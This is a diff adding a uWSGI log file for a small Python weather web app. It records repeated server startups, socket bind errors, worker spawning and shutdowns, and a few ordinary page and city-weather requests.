@@ -1,0 +1,918 @@
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:38:55 2024] ***
+compiled with version: 11.4.0 on 02 April 2024 19:33:37
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+bind(): No such file or directory [core/socket.c line 230]
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:41:53 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+bind(): No such file or directory [core/socket.c line 230]
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:42:38 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+bind(): No such file or directory [core/socket.c line 230]
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:42:50 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+bind(): No such file or directory [core/socket.c line 230]
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:43:19 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+bind(): No such file or directory [core/socket.c line 230]
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:46:23 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+bind(): Permission denied [core/socket.c line 230]
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:47:25 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x562667f26370
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x562667f26370 pid: 2037 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 2037)
+spawned uWSGI worker 1 (pid: 2038, cores: 2)
+spawned uWSGI worker 2 (pid: 2039, cores: 2)
+spawned uWSGI worker 3 (pid: 2040, cores: 2)
+spawned uWSGI worker 4 (pid: 2042, cores: 2)
+spawned uWSGI worker 5 (pid: 2044, cores: 2)
+spawned uWSGI worker 6 (pid: 2046, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:48:12 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x55f1515a5370
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55f1515a5370 pid: 2100 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 2100)
+spawned uWSGI worker 1 (pid: 2103, cores: 2)
+spawned uWSGI worker 2 (pid: 2104, cores: 2)
+spawned uWSGI worker 3 (pid: 2105, cores: 2)
+spawned uWSGI worker 4 (pid: 2107, cores: 2)
+spawned uWSGI worker 5 (pid: 2109, cores: 2)
+spawned uWSGI worker 6 (pid: 2112, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:50:08 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x5654166e4370
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5654166e4370 pid: 2146 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 2146)
+spawned uWSGI worker 1 (pid: 2148, cores: 2)
+spawned uWSGI worker 2 (pid: 2149, cores: 2)
+spawned uWSGI worker 3 (pid: 2150, cores: 2)
+spawned uWSGI worker 4 (pid: 2152, cores: 2)
+spawned uWSGI worker 5 (pid: 2154, cores: 2)
+spawned uWSGI worker 6 (pid: 2156, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:50:19 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x5557f4c16370
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5557f4c16370 pid: 2193 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 2193)
+spawned uWSGI worker 1 (pid: 2194, cores: 2)
+spawned uWSGI worker 2 (pid: 2195, cores: 2)
+spawned uWSGI worker 3 (pid: 2196, cores: 2)
+spawned uWSGI worker 4 (pid: 2198, cores: 2)
+spawned uWSGI worker 5 (pid: 2200, cores: 2)
+spawned uWSGI worker 6 (pid: 2202, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 12:51:58 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x558ee57da370
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 4 seconds on interpreter 0x558ee57da370 pid: 719 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 719)
+spawned uWSGI worker 1 (pid: 833, cores: 2)
+spawned uWSGI worker 2 (pid: 835, cores: 2)
+spawned uWSGI worker 3 (pid: 836, cores: 2)
+spawned uWSGI worker 4 (pid: 838, cores: 2)
+spawned uWSGI worker 5 (pid: 839, cores: 2)
+spawned uWSGI worker 6 (pid: 841, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 16:03:56 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x561833bed8f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 4 seconds on interpreter 0x561833bed8f0 pid: 721 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 721)
+spawned uWSGI worker 1 (pid: 823, cores: 2)
+spawned uWSGI worker 2 (pid: 825, cores: 2)
+spawned uWSGI worker 3 (pid: 826, cores: 2)
+spawned uWSGI worker 4 (pid: 828, cores: 2)
+spawned uWSGI worker 5 (pid: 830, cores: 2)
+spawned uWSGI worker 6 (pid: 832, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 16:07:33 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x56432d81d8f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56432d81d8f0 pid: 1235 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1235)
+spawned uWSGI worker 1 (pid: 1236, cores: 2)
+spawned uWSGI worker 2 (pid: 1237, cores: 2)
+spawned uWSGI worker 3 (pid: 1238, cores: 2)
+spawned uWSGI worker 4 (pid: 1240, cores: 2)
+spawned uWSGI worker 5 (pid: 1242, cores: 2)
+spawned uWSGI worker 6 (pid: 1244, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 16:16:48 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x560ad8cea8f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x560ad8cea8f0 pid: 1331 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1331)
+spawned uWSGI worker 1 (pid: 1334, cores: 2)
+spawned uWSGI worker 2 (pid: 1335, cores: 2)
+spawned uWSGI worker 3 (pid: 1336, cores: 2)
+spawned uWSGI worker 4 (pid: 1338, cores: 2)
+spawned uWSGI worker 5 (pid: 1340, cores: 2)
+spawned uWSGI worker 6 (pid: 1342, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 16:19:02 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x55d7abe598f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 4 seconds on interpreter 0x55d7abe598f0 pid: 721 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 721)
+spawned uWSGI worker 1 (pid: 828, cores: 2)
+spawned uWSGI worker 2 (pid: 829, cores: 2)
+spawned uWSGI worker 3 (pid: 831, cores: 2)
+spawned uWSGI worker 4 (pid: 833, cores: 2)
+spawned uWSGI worker 5 (pid: 835, cores: 2)
+spawned uWSGI worker 6 (pid: 836, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 18:55:49 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x5616c6e0c8f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 4 seconds on interpreter 0x5616c6e0c8f0 pid: 721 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 721)
+spawned uWSGI worker 1 (pid: 825, cores: 2)
+spawned uWSGI worker 2 (pid: 826, cores: 2)
+spawned uWSGI worker 3 (pid: 827, cores: 2)
+spawned uWSGI worker 4 (pid: 829, cores: 2)
+spawned uWSGI worker 5 (pid: 830, cores: 2)
+spawned uWSGI worker 6 (pid: 831, cores: 2)
+{address space usage: 155578368 bytes/148MB} {rss usage: 27791360 bytes/26MB} [pid: 825|app: 0|req: 1/1] 192.168.1.100 () {42 vars in 768 bytes} [Thu Apr  4 18:55:57 2024] GET / => generated 574 bytes in 72 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156790784 bytes/149MB} {rss usage: 28311552 bytes/27MB} [pid: 829|app: 0|req: 1/2] 192.168.1.100 () {40 vars in 667 bytes} [Thu Apr  4 18:55:57 2024] GET /static/styles/style.css => generated 359 bytes in 89 msecs via sendfile() (HTTP/1.1 200) 7 headers in 278 bytes (0 switches on core 0)
+{address space usage: 155578368 bytes/148MB} {rss usage: 27832320 bytes/26MB} [pid: 827|app: 0|req: 1/3] 46.10.204.54 () {44 vars in 798 bytes} [Thu Apr  4 18:56:12 2024] GET / => generated 574 bytes in 31 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156790784 bytes/149MB} {rss usage: 28311552 bytes/27MB} [pid: 829|app: 0|req: 2/4] 46.10.204.54 () {44 vars in 728 bytes} [Thu Apr  4 18:56:12 2024] GET /static/styles/style.css => generated 359 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 7 headers in 278 bytes (0 switches on core 1)
+{address space usage: 155578368 bytes/148MB} {rss usage: 27049984 bytes/25MB} [pid: 830|app: 0|req: 1/5] 46.10.204.54 () {40 vars in 688 bytes} [Thu Apr  4 18:56:13 2024] GET /favicon.ico => generated 207 bytes in 8 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156626944 bytes/149MB} {rss usage: 28860416 bytes/27MB} [pid: 830|app: 0|req: 2/6] 46.10.204.54 () {42 vars in 807 bytes} [Thu Apr  4 18:56:16 2024] GET /weather?city=Omaha => generated 1108 bytes in 236 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+{address space usage: 156790784 bytes/149MB} {rss usage: 28344320 bytes/27MB} [pid: 826|app: 0|req: 1/7] 46.10.204.54 () {44 vars in 795 bytes} [Thu Apr  4 18:56:16 2024] GET /static/styles/style.css => generated 0 bytes in 40 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 0)
+{address space usage: 156626944 bytes/149MB} {rss usage: 28663808 bytes/27MB} [pid: 825|app: 0|req: 2/8] 46.10.204.54 () {42 vars in 815 bytes} [Thu Apr  4 18:56:26 2024] GET /weather?city= => generated 1123 bytes in 129 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+{address space usage: 156790784 bytes/149MB} {rss usage: 28344320 bytes/27MB} [pid: 826|app: 0|req: 2/9] 46.10.204.54 () {44 vars in 790 bytes} [Thu Apr  4 18:56:26 2024] GET /static/styles/style.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+{address space usage: 155578368 bytes/148MB} {rss usage: 27832320 bytes/26MB} [pid: 831|app: 0|req: 1/10] 46.10.204.54 () {44 vars in 798 bytes} [Thu Apr  4 18:57:19 2024] GET / => generated 574 bytes in 31 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156626944 bytes/149MB} {rss usage: 28786688 bytes/27MB} [pid: 827|app: 0|req: 2/11] 46.10.204.54 () {48 vars in 839 bytes} [Thu Apr  4 18:57:19 2024] GET /static/styles/style.css => generated 0 bytes in 33 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+{address space usage: 156626944 bytes/149MB} {rss usage: 28672000 bytes/27MB} [pid: 831|app: 0|req: 2/12] 46.10.204.54 () {42 vars in 803 bytes} [Thu Apr  4 18:57:29 2024] GET /weather?city=nis => generated 1118 bytes in 156 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+{address space usage: 156774400 bytes/149MB} {rss usage: 29458432 bytes/28MB} [pid: 825|app: 0|req: 3/13] 46.10.204.54 () {44 vars in 793 bytes} [Thu Apr  4 18:57:29 2024] GET /static/styles/style.css => generated 0 bytes in 39 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 0)
+{address space usage: 156790784 bytes/149MB} {rss usage: 28880896 bytes/27MB} [pid: 829|app: 0|req: 3/14] 35.203.211.200 () {30 vars in 620 bytes} [Thu Apr  4 19:04:21 2024] GET / => generated 574 bytes in 24 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+SIGINT/SIGTERM received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 19:08:58 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x558a28e208f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 4 seconds on interpreter 0x558a28e208f0 pid: 720 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 720)
+spawned uWSGI worker 1 (pid: 827, cores: 2)
+spawned uWSGI worker 2 (pid: 828, cores: 2)
+spawned uWSGI worker 3 (pid: 830, cores: 2)
+spawned uWSGI worker 4 (pid: 832, cores: 2)
+spawned uWSGI worker 5 (pid: 833, cores: 2)
+spawned uWSGI worker 6 (pid: 835, cores: 2)
